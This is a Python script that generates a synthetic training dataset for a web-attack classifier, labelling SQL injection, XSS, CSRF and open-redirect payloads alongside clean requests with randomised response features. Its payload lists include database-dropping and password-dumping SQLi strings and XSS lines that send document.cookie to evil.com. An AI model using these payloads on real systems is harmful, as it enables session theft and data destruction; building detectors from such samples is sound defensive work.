import pandas as pd
import numpy as np
import os

np.random.seed(42)

# ─────────────────────────────────────────────
# SECTION 1: SQLi payloads (real-world patterns)
# ─────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, username, password FROM users --",
    "' AND 1=2 UNION SELECT 1,2,3 --",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1; SELECT * FROM information_schema.tables",
    "' AND SLEEP(5) --",
    "'; EXEC xp_cmdshell('dir') --",
    "' OR pg_sleep(5) --",
    "1 AND 1=1",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' AND 1=1 --",
    "or 1=1",
    "' OR 'x'='x",
    "'; INSERT INTO users VALUES ('hacker','hacked') --",
    "' AND substring(username,1,1)='a",
    "1' ORDER BY 3 --",
    "' GROUP BY columnnames HAVING 1=1 --",
    "' AND ascii(substring(username,1,1)) > 64 --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR 1=1 LIMIT 1 --",
    "1 UNION ALL SELECT NULL,NULL,NULL --",
]

def generate_sqli_data(n: int = 200) -> pd.DataFrame:
    payloads = [SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(200, 600, n),  # slow — DB errors
        "status_code":          np.random.choice([500, 200, 403], n, p=[0.6, 0.3, 0.1]),
        "payload_reflected":    np.random.choice([True, False], n, p=[0.2, 0.8]),
        "error_detected":       np.random.choice([True, False], n, p=[0.85, 0.15]),
        "response_length_diff": np.random.randint(200, 800, n),  # large — DB dump
        "label":                "SQLi"
    })


# ─────────────────────────────────────────────
# SECTION 2: XSS payloads
# ─────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(document.cookie)</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<img src=1 onerror=this.src='http://evil.com?'+document.cookie>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
    "<div style=background:url(javascript:alert(1))>",
    "<object data=javascript:alert(1)>",
    "<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>",
    "<script>window.location='http://evil.com'</script>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<script>new Image().src='http://evil.com?c='+document.cookie</script>",
    "<body background=javascript:alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
]

def generate_xss_data(n: int = 200) -> pd.DataFrame:
    payloads = [XSS_PAYLOADS[i % len(XSS_PAYLOADS)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(100, 300, n),  # fast — reflected immediately
        "status_code":          np.random.choice([200, 301], n, p=[0.95, 0.05]),
        "payload_reflected":    np.random.choice([True, False], n, p=[0.9, 0.1]),
        "error_detected":       np.random.choice([True, False], n, p=[0.1, 0.9]),
        "response_length_diff": np.random.randint(50, 300, n),
        "label":                "XSS"
    })


# ─────────────────────────────────────────────
# SECTION 3: CSRF payloads
# ─────────────────────────────────────────────

CSRF_PAYLOADS = [
    "<form action='http://target.com/transfer' method='POST'>",
    "<img src='http://target.com/delete?id=1'>",
    "POST /transfer amount=1000&to=attacker",
    "<form method=POST action=/api/change-email>",
    "fetch('/api/user/delete', {method:'POST'})",
    "<a href='http://target.com/logout'>click</a>",
    "XMLHttpRequest POST /api/password/change",
    "<iframe src='http://target.com/api/transfer?amount=500'>",
    "auto-submit form without CSRF token",
    "cross-origin POST request no SameSite cookie",
    "POST /api/update-profile no-csrf-token",
    "form submit missing X-CSRF-Token header",
    "cross-site request with session cookie",
    "POST /admin/create-user from external origin",
    "<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",
]

def generate_csrf_data(n: int = 100) -> pd.DataFrame:
    payloads = [CSRF_PAYLOADS[i % len(CSRF_PAYLOADS)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(80, 250, n),
        "status_code":          np.random.choice([200, 302, 403], n, p=[0.5, 0.3, 0.2]),
        "payload_reflected":    np.random.choice([True, False], n, p=[0.1, 0.9]),
        "error_detected":       np.random.choice([True, False], n, p=[0.05, 0.95]),
        "response_length_diff": np.random.randint(10, 150, n),
        "label":                "CSRF"
    })


# ─────────────────────────────────────────────
# SECTION 4: Open Redirect payloads
# ─────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "?next=http://evil.com",
    "?redirect=//evil.com",
    "?url=http://phishing.com",
    "?return_to=http://attacker.com",
    "?goto=http://malicious.com",
    "?continue=//evil.com/steal",
    "?forward=http://evil.com",
    "?dest=http://attacker.com/phish",
    "?redir=http://evil.com",
    "?location=http://attacker.com",
    "?next=//attacker.com",
    "?redirect_uri=http://evil.com",
    "?callback=http://attacker.com",
    "?return=http://phishing.com",
    "?target=//evil.com/fake-login",
]

def generate_redirect_data(n: int = 100) -> pd.DataFrame:
    payloads = [REDIRECT_PAYLOADS[i % len(REDIRECT_PAYLOADS)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(50, 200, n),
        "status_code":          np.random.choice([301, 302, 200], n, p=[0.5, 0.4, 0.1]),
        "payload_reflected":    np.random.choice([True, False], n, p=[0.3, 0.7]),
        "error_detected":       np.random.choice([True, False], n, p=[0.05, 0.95]),
        "response_length_diff": np.random.randint(0, 100, n),
        "label":                "Open Redirect"
    })


# ─────────────────────────────────────────────
# SECTION 5: Clean rows (not vulnerable)
# ─────────────────────────────────────────────

CLEAN_PAYLOADS = [
    "SELECT * FROM products WHERE id = ?",
    "GET /api/products HTTP/1.1",
    "username=john&password=pass123",
    "search=laptop",
    "page=2&limit=10",
    "email=user@example.com",
    "GET /home HTTP/1.1",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9",
    "Content-Type: application/json",
    "GET /api/v1/status HTTP/1.1",
    "POST /api/login {email, password}",
    "filter=price_asc&category=books",
    "GET /dashboard HTTP/1.1",
    "PUT /api/user/profile {name, bio}",
    "DELETE /api/cart/item/42",
]

def generate_clean_data(n: int = 150) -> pd.DataFrame:
    payloads = [CLEAN_PAYLOADS[i % len(CLEAN_PAYLOADS)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(50, 180, n),
        "status_code":          np.random.choice([200, 201, 204], n, p=[0.8, 0.1, 0.1]),
        "payload_reflected":    np.random.choice([True, False], n, p=[0.05, 0.95]),
        "error_detected":       np.random.choice([True, False], n, p=[0.02, 0.98]),
        "response_length_diff": np.random.randint(0, 80, n),
        "label":                "Clean"
    })


# ─────────────────────────────────────────────
# SECTION 6: Noise rows (ambiguous — reduces overconfidence)
# ─────────────────────────────────────────────

def generate_noise_data(n: int = 100) -> pd.DataFrame:
    all_payloads = (SQLI_PAYLOADS + XSS_PAYLOADS +
                    CSRF_PAYLOADS + REDIRECT_PAYLOADS + CLEAN_PAYLOADS)
    payloads = [all_payloads[i % len(all_payloads)] for i in range(n)]
    return pd.DataFrame({
        "payload":              payloads,
        "response_time":        np.random.randint(50, 600, n),
        "status_code":          np.random.choice([200, 301, 403, 500], n,
                                                  p=[0.4, 0.2, 0.2, 0.2]),
        "payload_reflected":    np.random.choice([True, False], n),
        "error_detected":       np.random.choice([True, False], n),
        "response_length_diff": np.random.randint(0, 800, n),
        "label":                "Clean"  # ambiguous = conservative label
    })


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def main():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    output   = os.path.join(base_dir, "training_dataset.csv")

    print("Generating SQLi data...")
    sqli_df     = generate_sqli_data(n=200)
    print(f"  SQLi rows      : {len(sqli_df)}")

    print("Generating XSS data...")
    xss_df      = generate_xss_data(n=200)
    print(f"  XSS rows       : {len(xss_df)}")

    print("Generating CSRF data...")
    csrf_df     = generate_csrf_data(n=100)
    print(f"  CSRF rows      : {len(csrf_df)}")

    print("Generating Open Redirect data...")
    redirect_df = generate_redirect_data(n=100)
    print(f"  Redirect rows  : {len(redirect_df)}")

    print("Generating Clean data...")
    clean_df    = generate_clean_data(n=150)
    print(f"  Clean rows     : {len(clean_df)}")

    print("Generating Noise data...")
    noise_df    = generate_noise_data(n=100)
    print(f"  Noise rows     : {len(noise_df)}")

    # Combine + shuffle
    final_df = pd.concat(
        [sqli_df, xss_df, csrf_df, redirect_df, clean_df, noise_df],
        ignore_index=True
    )
    final_df = final_df.sample(frac=1, random_state=42).reset_index(drop=True)
    final_df.to_csv(output, index=False)

    print(f"\n✅ Dataset saved    : {output}")
    print(f"   Total rows       : {len(final_df)}")
    print(f"\n   Label distribution:")
    print(final_df["label"].value_counts().to_string())
    print(f"\n   Columns          : {final_df.columns.tolist()}")
    print(f"\n   Sample row:")
    print(final_df.iloc[0].to_dict())

if __name__ == "__main__":
    main()